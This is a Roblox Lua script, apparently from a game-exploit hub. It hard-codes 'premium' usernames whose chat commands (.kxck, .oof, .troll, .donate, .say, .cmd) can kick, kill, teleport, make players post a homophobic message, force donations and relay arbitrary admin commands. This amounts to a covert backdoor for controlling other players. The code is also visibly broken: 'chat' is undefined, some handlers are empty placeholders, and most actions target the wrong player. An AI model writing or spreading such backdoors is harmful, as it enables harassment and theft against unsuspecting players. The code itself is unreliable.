
local PremiumUserNames = {
    "adam1102928181",
    "LittleJonib",
    "xylar103",
    "whoareyiu24",
}

local function isPremium(userName)
    for _, name in ipairs(PremiumUserNames) do
        if name == userName then
            return true
        end
    end
    return false
end

-- Function to set up chat listener for a player
local function setupPremiumChatListener(player)
    if isPremium(player.Name) then
        player.Chatted:Connect(function(cht)
            -- Your command handling logic here
            -- Wrap only specific chat commands with send async if needed
            if cht:match(".fling .") then
                if player ~= game.Players.LocalPlayer then
                    -- your fling code
                end
            elseif cht:match(".freeze .") then
                if player ~= game.Players.LocalPlayer then
                    -- your freeze code
                end
            elseif cht:match(".unfreeze .") then
                if player ~= game.Players.LocalPlayer then
                    -- your unfreeze code
                end
            elseif cht:match(".kxck .") then
                if player ~= game.Players.LocalPlayer then
                    spawn(function()
                        player:Kick("You have been kicked.")
                    end)
                end
            elseif cht:match(".oof .") then
                if player ~= game.Players.LocalPlayer then
                    spawn(function()
                        player.Character.Humanoid:Destroy()
                    end)
                end
            elseif cht:match(".error .") then
                if player ~= game.Players.LocalPlayer then
                    spawn(function()
                        player.Character.HumanoidRootPart.CFrame = CFrame.new(99999, 99999, 99999)
                    end)
                end
            elseif cht:match(".bring .") then
                if player ~= game.Players.LocalPlayer then
                    spawn(function()
                        player.Character.HumanoidRootPart.CFrame = CFrame.new(player.Character.UpperTorso.Position)
                    end)
                end
            elseif cht:match(".sit .") then
                if player ~= game.Players.LocalPlayer then
                    local humanoid = player.Character and player.Character:FindFirstChildOfClass("Humanoid")
                    if humanoid then humanoid.Sit = true end
                end
            elseif cht:match(".troll .") then
                if player ~= game.Players.LocalPlayer then
                    spawn(function()
                        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("im gay", "All")
                    end)
                end
            elseif cht:match(".unsit .") then
                if player ~= game.Players.LocalPlayer then
                    local humanoid = player.Character and player.Character:FindFirstChildOfClass("Humanoid")
                    if humanoid then humanoid.Sit = false end
                end
            elseif cht:match(".enlighten .") then
                if player ~= game.Players.LocalPlayer then
                    spawn(function()
                        chat:SendAsync(";enlighten " .. player.Name)
                    end)
                end
            elseif cht:match(".donate .") then
                local text = cht:match(".donate (.+)")
                if player ~= game.Players.LocalPlayer then
                    spawn(function()
                        chat:SendAsync(";donate " .. text)
                    end)
                end
            elseif cht:match(".say .") then
                local text = cht:match(".say (.+)")
                if player ~= game.Players.LocalPlayer then
                    spawn(function()
                        chat:SendAsync(text)
                    end)
                end
            elseif cht:match("^%.cmd .+") then
                local text = cht:match("^%.cmd (.+)")
                if player ~= game.Players.LocalPlayer then
                    spawn(function()
                        chat:SendAsync(";" .. text)
                    end)
                end
            elseif cht:match(".cmdx") then
                if player == game.Players.LocalPlayer then
                    spawn(function()
                        game:GetService("StarterGui"):SetCore("SendNotification",{
                            Title = "Available Commands",
                            Text = ".freeze .bring .error .oof .kxck .fling .sit .unsit .troll .donate .say .enlighten .cmd",
                            Time = 5,
                            Icon = "rbxassetid://999999999",
                        })
                    end)
                end
            end
        end)
    end
end

-- Set up existing players
for _, p in ipairs(game.Players:GetPlayers()) do
    setupPremiumChatListener(p)
end

-- Set up for new players joining
game.Players.PlayerAdded:Connect(function(player)
    setupPremiumChatListener(player)
end)
